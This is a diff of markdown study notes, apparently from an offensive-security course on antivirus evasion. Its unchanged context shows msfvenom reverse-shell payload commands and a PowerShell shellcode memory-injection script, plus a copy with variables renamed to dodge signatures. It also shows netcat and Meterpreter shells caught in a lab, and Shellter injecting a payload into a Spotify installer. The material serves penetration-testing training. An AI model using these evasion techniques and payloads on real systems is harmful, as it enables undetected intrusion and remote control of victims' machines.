@@ -161,6 +161,7 @@ Before generating a payload, make sure Kali and MSF are up to date.  MSF is upda
  - `LPORT` rev shell local port.
  - `-f` specifying `EXE` file format.
 	- `>` output a file names `binary.exe`
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/fixing-exploits]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.239 LPORT=4444 -f exe > binary.exe
@@ -170,9 +171,10 @@ No encoder specified, outputting raw payload
 Payload size: 324 bytes
 Final size of exe file: 73802 bytes
 ```
+
 - Scan the exe using VirusTotal.
  - *VirusTotal is convenient, but it generates a hash along with storing the original file for each unique submission. The submitted files along with the metadata are then shared with all participating AV vendors. As such, take care when submitting sensitive payloads as the hash is considered public from the time of first submission.*.
-![d2c73438e913b954933365e758704e5f.png](../_resources/d2c73438e913b954933365e758704e5f.png)
+![d2c73438e913b954933365e758704e5f.png](assets/static/resources/d2c73438e913b954933365e758704e5f.png)
  - Many AV products flag the file as malicious based on various methods descibed here.
 
 #### 14.1 Bypassing Antivirus Detections
@@ -300,6 +302,7 @@ PowerShell can interact with the [Windows API](https://blogs.technet.microsoft.c
 In the event the script is marked as mal, it can be easily altered.  AV will often review the variable names, comments, and logic which can be altered without the need to recompile.
 
 To demonstrate, we will analyze a well-known version of a memory injection PowerShell script and test it against it with Avira.  The basic template for memory injection;
+
 ```
 $code = '
 [DllImport("kernel32.dll")]
@@ -327,6 +330,7 @@ for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i
 
 $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 ```
+
 - The scripts starts with imports.
  - VirtualAlloc.
   - From  `kernel32.dll`
@@ -345,6 +349,7 @@ $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
  - Uses the `CreateThread` API.
 - We have to add a payload and will use the same one as the PE for consistency.
  - Generate with msfvenom.
+
 ```bash
 kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
 ...
@@ -356,10 +361,11 @@ Final size of powershell file: 3454 bytes
 [Byte[]] $sc =  0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28
 ...
 ```
+
 - Copy the output into the script.
 
 Next we validate the detection rate of the PS1 script.  AntiScan.me is the first choice, but does not support PS1, se we must use VirusTotal.
-![1e0e231418742146669ea4729a1b7a39.png](../_resources/1e0e231418742146669ea4729a1b7a39.png)
+![1e0e231418742146669ea4729a1b7a39.png](assets/static/resources/1e0e231418742146669ea4729a1b7a39.png)
 - 29/59, not great!
  - We need to circumvent some of the AV sig logic.
 - Scripts are just interpreted text files.
@@ -369,6 +375,7 @@ Next we validate the detection rate of the PS1 script.  AntiScan.me is the first
  - Variable names.
  - Function names.
 - To bypass that logic, we can give our variables more generic names.
+
 ```
 $var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;
 
@@ -386,6 +393,7 @@ for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i)
 
 $var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 ```
+
 - We have changed.
 	- `Win32` hard-coded class name for the `Add-Type` cmdlet to `iWin32`
 	- `$sc` to `$var1`
@@ -410,6 +418,7 @@ $var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 	- `Get-ExecutionPolicy -Scope CurrentUser`
 - Then set it to *Unrestricted*;
 	- `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`
+
 ```powershell
 PS C:\Users\offsec\Desktop> .\meminj.ps1
 .\meminj.ps1 : File C:\Users\offsec\Desktop\meminj.ps1 cannot be loaded because running scripts is disabled on this
@@ -431,8 +440,10 @@ https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the executi
 PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
 Unrestricted
 ```
+
 - Now we start a local netcat listener and run our scipts.
 - The script executes and we receive a reverse shell.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/av-evasion]
 └─$ nc -nvlp 443            
@@ -445,6 +456,7 @@ C:\Users\offsec>whoami
 whoami
 client01\offsec
 ```
+
 - Thus, we have evaded Avira AV successfully.
 - Mature orgs implement various ML systems to analyze scripts run on systems.
  - This may require adaptations.
@@ -502,6 +514,7 @@ client01\offsec
    - Since Shellter obfuscates the payload and decoder before injection, Avira does not detect it as mal.
   - Exec the PE and we are presented with the default Spotify Installer.
 	- Return to our multi/handler and we receive a Meterpreter shell!
+
 ```
 [*] Using configured payload generic/shell_reverse_tcp
 payload => windows/meterpreter/reverse_tcp
@@ -523,5 +536,6 @@ client01\offsec
 
 C:\Users\offsec\Desktop>
 ```
+
 - We have successfully evaded AV with Shellter, bypassed Avira AV, and compromised our target!
 
